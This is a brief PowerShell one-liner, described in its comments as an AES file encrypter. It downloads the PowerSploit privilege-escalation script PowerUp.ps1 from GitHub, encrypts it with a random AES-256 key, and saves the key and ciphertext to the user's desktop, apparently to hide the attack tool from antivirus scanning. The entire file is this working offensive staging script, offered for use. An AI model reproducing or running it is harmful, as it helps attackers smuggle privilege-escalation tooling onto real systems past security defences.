#One-Liner Powershell script encrypter that use AES
#INPUT: the file that we want to encrypt is saved in $unencryptedString
#OUTPUT: the encrypted file is saved in "$env:userprofile\Desktop\file"
$unencryptedString = (New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 ');$aesManaged = New-Object "System.Security.Cryptography.AesManaged";$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC;$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;$aesManaged.BlockSize = 128;$aesManaged.KeySize = 256;$aesManaged.GenerateKey();$key=[System.Convert]::ToBase64String($aesManaged.Key);$key;$bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString);$encryptor = $aesManaged.CreateEncryptor();$encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);[byte[]] $fullData = $aesManaged.IV + $encryptedData;$aesManaged.Dispose();$encryptedString = [System.Convert]::ToBase64String($fullData);[System.IO.File]::WriteAllText("$env:userprofile\desktop\file",$key+$encryptedString)
